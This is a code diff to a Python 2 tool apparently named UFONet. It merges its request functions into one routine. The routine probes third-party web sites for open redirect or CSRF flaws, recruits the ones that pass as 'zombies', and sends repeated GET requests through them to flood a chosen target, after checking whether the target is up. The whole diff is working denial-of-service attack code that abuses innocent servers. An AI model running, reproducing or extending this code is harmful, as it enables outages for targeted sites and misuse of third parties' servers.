@@ -7,11 +7,11 @@ You should have received a copy of the GNU General Public License along
 with masxssive; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import os, sys, re, traceback, random
+import os, sys, re, traceback, random, time
 import pycurl, StringIO, urllib
 from urlparse import urlparse
 from options import UFONetOptions
-DEBUG = 1
+DEBUG = 0
 
 class UFONet(object):
     def __init__(self):
@@ -44,7 +44,13 @@ class UFONet(object):
         self.agents.append('TwitterBot (http://www.twitter.com)')
         self.user_agent = random.choice(self.agents).strip()
 
-        self.referer = 'http://127.0.0.1'
+        self.referer = 'http://127.0.0.1/'
+        self.head = False
+        self.payload = False
+        self.external = False
+        self.attack_mode = False
+        self.retries = ''
+        self.delay = ''
 
     def set_options(self, options):
         self.options = options
@@ -167,76 +173,103 @@ class UFONet(object):
                 f.write(zombie + os.linesep)
             f.close()
 
-    def head_connection(self, zombie):
+    def connect_zombies(self, zombie):
+        # connect zombies and manage different options: HEAD, GET, POST,
+        # user-Agent, referer, timeout, retries, threads, delay..
         options = self.options
-        # try a HEAD connection to the target
         c = pycurl.Curl()
-        c.setopt(pycurl.NOBODY,1) # HEAD
-        c.setopt(pycurl.URL, zombie)
-        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8'])
-        if options.agent:
-            c.setopt(pycurl.USERAGENT, options.agent)
-        else:
-            c.setopt(pycurl.USERAGENT, self.user_agent)
-        if options.referer:
-            c.setopt(pycurl.REFERER, options.referer)
-        else:
-            c.setopt(pycurl.REFERER, self.referer)
-        c.setopt(pycurl.FOLLOWLOCATION, 1)
-        c.setopt(pycurl.SSL_VERIFYHOST, 0)
-        c.setopt(pycurl.SSL_VERIFYPEER, 0)
-        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3)
-        if options.proxy:
-            c.setopt(pycurl.PROXY, options.proxy)
-        else:
-            c.setopt(pycurl.PROXY, '')
+        if self.head == True:
+            c.setopt(pycurl.URL, zombie) # set 'zombie' target
+            c.setopt(pycurl.NOBODY,1) # use HEAD
+        if self.payload == True:
+            payload = zombie + "http://www.google.com" #XSS/CSRF payload
+            c.setopt(pycurl.URL, payload) # set 'zombie' target
+            c.setopt(pycurl.NOBODY,0)  # use GET
+        if self.external == True:
+            external_service = "http://www.downforeveryoneorjustme.com/"
+            external = external_service + options.target
+            c.setopt(pycurl.URL, external) # external HEAD check before to attack
+            c.setopt(pycurl.NOBODY,0)  # use GET
+        if self.attack_mode == True:
+            if options.place:
+                url_attack = zombie + options.target + "/"+ options.place # Use zombie vector to connect to a target's place
+            else:
+                url_attack = zombie + options.target # Use zombie vector to connect to original target url
+            c.setopt(pycurl.URL, url_attack) # GET connection on target site
+            c.setopt(pycurl.NOBODY,0)  # use GET
+        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8']) # set fake headers
+        c.setopt(pycurl.FOLLOWLOCATION, 1) # set follow redirects
+        c.setopt(pycurl.MAXREDIRS, 10) # set max redirects
+        c.setopt(pycurl.SSL_VERIFYHOST, 0) # don't verify host
+        c.setopt(pycurl.SSL_VERIFYPEER, 0) # don't verify peer
+        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
+        c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
+        c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
         b = StringIO.StringIO()
         c.setopt(pycurl.HEADERFUNCTION, b.write)
         h = StringIO.StringIO()
         c.setopt(pycurl.WRITEFUNCTION, h.write)
-        c.perform()
-        code_reply = c.getinfo(pycurl.HTTP_CODE)
-        reply = b.getvalue()
-        if options.verbose:
-            print "Reply:"
-            print "\n", reply
-        c.close()
-        return code_reply
-
-    def payload_connection(self, z):
-        payload = z + "http://www.google.com" #XSS/CSRF payload	
-        options = self.options
-        # check if CSRF vulnerability is allowed
-        c = pycurl.Curl()
-        c.setopt(pycurl.NOBODY,0) # GET
-        c.setopt(pycurl.URL, payload)
-        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8'])
-        if options.agent:
+        if options.agent: # set user-agent
             c.setopt(pycurl.USERAGENT, options.agent)
         else:
             c.setopt(pycurl.USERAGENT, self.user_agent)
-        if options.referer:
+        if options.referer: # set referer
             c.setopt(pycurl.REFERER, options.referer)
         else:
             c.setopt(pycurl.REFERER, self.referer)
-        c.setopt(pycurl.FOLLOWLOCATION, 1)
-        c.setopt(pycurl.SSL_VERIFYHOST, 0)
-        c.setopt(pycurl.SSL_VERIFYPEER, 0)
-        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3)
-        if options.proxy:
+        if options.proxy: # set proxy
             c.setopt(pycurl.PROXY, options.proxy)
         else:
             c.setopt(pycurl.PROXY, '')
-        b = StringIO.StringIO()
-        c.setopt(pycurl.HEADERFUNCTION, b.write)
-        h = StringIO.StringIO()
-        c.setopt(pycurl.WRITEFUNCTION, h.write)
-        c.perform()
-        payload_reply = h.getvalue()
-        if options.verbose:
-            print "Reply:"
-            print "\n", payload_reply
-        return payload_reply
+        if options.timeout: # set timeout
+            c.setopt(pycurl.TIMEOUT, options.timeout)
+            c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
+        else:
+            c.setopt(pycurl.TIMEOUT, 30)
+            c.setopt(pycurl.CONNECTTIMEOUT, 30)
+        if options.delay: # set delay
+            self.delay = options.delay
+        else:
+            self.delay = 0
+        if options.retries: # set retries
+            self.retries = options.retries
+        else:
+            self.retries = 1
+        try: # try to connect
+            c.perform()
+            time.sleep(self.delay)
+        except: # try retries
+            for count in range(0, self.retries):
+                time.sleep(self.delay)
+                c.perform()
+                if count == self.retries:
+                    print "\n[Error] - Imposible to connect. Aborting...\n"
+                    sys.exit(2)
+        if self.head == True: # HEAD reply
+            code_reply = c.getinfo(pycurl.HTTP_CODE)
+            reply = b.getvalue()
+            if options.verbose:
+                print "Reply:"
+                print "\n", reply
+            return code_reply
+        if self.external == True: # External reply
+            external_reply = h.getvalue()
+            if options.verbose:
+                print "Reply:"
+                print "\n", external_reply
+            return external_reply
+        if self.payload == True: # Payloads reply
+            payload_reply = h.getvalue()
+            if options.verbose:
+                print "Reply:"
+                print "\n", payload_reply
+            return payload_reply
+        if self.attack_mode == True: # Attack mode reply
+            attack_reply = h.getvalue()
+            if options.verbose:
+                print "Reply:"
+                print "\n", attack_reply
+            return attack_reply
 
     def testing(self, zombies):
         # test CSRF vulnerabilities on webapps and show statistics
@@ -253,14 +286,16 @@ class UFONet(object):
             t = urlparse(zombie)
             if zombie.startswith("http://") or zombie.startswith("https://"):
                 # send HEAD connection
-                code_reply = str(self.head_connection(zombie))
-                if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401":
+                self.head = True
+                code_reply = str(self.connect_zombies(zombie))
+                self.head = False
+                if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401" or code_reply == "403" or code_reply == "405":
                     name_zombie = t.netloc
                     print "Zombie:", name_zombie
                     print "Status: Ok ["+ code_reply + "]"
                     num_active_zombies = num_active_zombies + 1
                     active_zombies.append(zombie)
-                elif code_reply == "403":
+                elif code_reply == "404":
                     print "Zombie:", t.netloc
                     print "Status: Forbidden ["+ code_reply + "]"
                     num_failed_zombies = num_failed_zombies + 1
@@ -290,16 +325,18 @@ class UFONet(object):
         zombies_ready = []
         num_waiting_zombies = 0
         num_disconnected_zombies = 0
-        for z in active_zombies:
-            t = urlparse(z)
+        for zombie in active_zombies:
+            t = urlparse(zombie)
             name_zombie = t.netloc
-            payload_zombie = z
+            payload_zombie = zombie
             print "Vector:", payload_zombie
-            payload_reply = str(self.payload_connection(z))
-            if "http://www.google.com" in payload_reply: #CSRF reply
+            self.payload = True
+            payload_reply = str(self.connect_zombies(zombie))
+            self.payload = False
+            if "http://www.google.com" in payload_reply: #XSS/CSRF reply
                 num_waiting_zombies = num_waiting_zombies + 1
                 print "Status:", "Waiting..."
-                zombies_ready.append(z)
+                zombies_ready.append(zombie)
             else:
                 num_disconnected_zombies = num_disconnected_zombies + 1
                 print "Status:", "Disconnected..."
@@ -325,7 +362,6 @@ class UFONet(object):
         # update 'zombies' list
         if num_active_zombie == 0:
             print "\n[INFO] - You haven't any 'zombie'. Try to update your list!\n"
-
         else:
             update_reply = raw_input("Wanna update your list (Y/n)")
             print '-'*25
@@ -354,8 +390,9 @@ class UFONet(object):
         print "Round: 'Is target up?'"
         print '='*21
         # send HEAD connection
+        self.head = True
         try:
-            reply = self.head_connection(target)
+            reply = self.connect_zombies(target)
             if reply:
                 print "From here: YES"
                 head_check_here = True
@@ -363,43 +400,15 @@ class UFONet(object):
                 print "From here: NO"
                 head_check_here = False
         except Exception:
-            print "\n[Error] - Cannot check if target is up!\n"
+            print "\n[Error] - Cannot check from your connection, if target is up!\n"
             print "From Here: NO"
             head_check_here = False
+        self.head = False
         print '-'*21
         # check target on third party service (ex: http://www.downforeveryoneorjustme.com)
+        self.external = True
         try:
-            external_service = "http://www.downforeveryoneorjustme.com/"
-            c = pycurl.Curl()
-            c.setopt(pycurl.NOBODY,0) # GET
-            c.setopt(pycurl.URL, external_service + target)
-            c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8'])
-            if options.agent:
-                c.setopt(pycurl.USERAGENT, options.agent)
-            else:
-                c.setopt(pycurl.USERAGENT, self.user_agent)
-            if options.referer:
-                c.setopt(pycurl.REFERER, options.referer)
-            else:
-                c.setopt(pycurl.REFERER, self.referer)
-            c.setopt(pycurl.FOLLOWLOCATION, 1)
-            c.setopt(pycurl.SSL_VERIFYHOST, 0)
-            c.setopt(pycurl.SSL_VERIFYPEER, 0)
-            c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3)
-            if options.proxy:
-                c.setopt(pycurl.PROXY, options.proxy)
-            else:
-                c.setopt(pycurl.PROXY, '')
-            b = StringIO.StringIO()
-            c.setopt(pycurl.HEADERFUNCTION, b.write)
-            h = StringIO.StringIO()
-            c.setopt(pycurl.WRITEFUNCTION, h.write)
-            c.perform()
-            data1 = h.getvalue()
-            if options.verbose:
-                print "Reply:"
-                print "\n", data1
-            external_reply = data1
+            external_reply = self.connect_zombies(target)
             if "It's just you" in external_reply: # parse external service for correct reply
                 print "From exterior: YES"
                 head_check_external = True
@@ -407,9 +416,10 @@ class UFONet(object):
                 print "From exterior: NO"
                 head_check_external = False
         except Exception: 
-            print "\n[Error] - Cannot check with:", external_service, "if target is up!\n"
+            print "\n[Error] - Cannot check from external services, if target is up!\n"
             print "From exterior: NO"
             head_check_external = False
+        self.external = False
         print '-'*21, "\n"
         # ask for start the attack
         if head_check_here == True or head_check_external == True:
@@ -421,51 +431,28 @@ class UFONet(object):
                     total_rounds = 1
                 num_round = 1
                 num_hits = 0
+                num_zombie = 1
                 # start to attack the target with each zombie
                 zombies = self.extract_zombies() # extract zombies from file
+                total_zombie = len(zombies)
                 for i in range(0, int(total_rounds)):
                     for zombie in zombies:
-                        print '='*30
-                        print "Round:", num_round, "| Total:", total_rounds
-                        print '='*30
+                        print '='*45
+                        print "Zombie:", num_zombie, "| Round:", num_round, "| Total:", total_rounds
+                        print '='*45
                         t = urlparse(zombie)
                         name_zombie = t.netloc
-                        c = pycurl.Curl()
-                        c.setopt(pycurl.NOBODY,0) # GET
-                        c.setopt(pycurl.URL, zombie + target)
-                        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8'])
-                        if options.agent:
-                            c.setopt(pycurl.USERAGENT, options.agent)
-                        else:
-                            c.setopt(pycurl.USERAGENT, self.user_agent)
-                        if options.referer:
-                            c.setopt(pycurl.REFERER, options.referer)
-                        else:
-                            c.setopt(pycurl.REFERER, self.referer)
-                        c.setopt(pycurl.FOLLOWLOCATION, 1)
-                        c.setopt(pycurl.SSL_VERIFYHOST, 0)
-                        c.setopt(pycurl.SSL_VERIFYPEER, 0)
-                        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3)
-                        if options.proxy:
-                            c.setopt(pycurl.PROXY, options.proxy)
-                        else:
-                            c.setopt(pycurl.PROXY, '')
-			b = StringIO.StringIO()
-			c.setopt(pycurl.HEADERFUNCTION, b.write)
-			h = StringIO.StringIO()
-			c.setopt(pycurl.WRITEFUNCTION, h.write)
-			c.perform()
-                        data1 = h.getvalue()
-                        print "Zombie:", name_zombie
-                        # target response
-                        if options.verbose:
-                            print "Reply:"
-                            print "\n", data1
+                        self.attack_mode = True
+                        print "Name:", name_zombie
+                        attack_reply = self.connect_zombies(zombie)
                         print "Status: Hit!"
                         num_hits = num_hits + 1
+                        num_zombie = num_zombie + 1
+                        if num_zombie > total_zombie:
+                            num_zombie = 1
                         print '-'*10
                     num_round = num_round + 1
-	            c.close()
+                attack_mode = False
                 print '='*21
                 print "Total hits:", num_hits
                 print '='*21
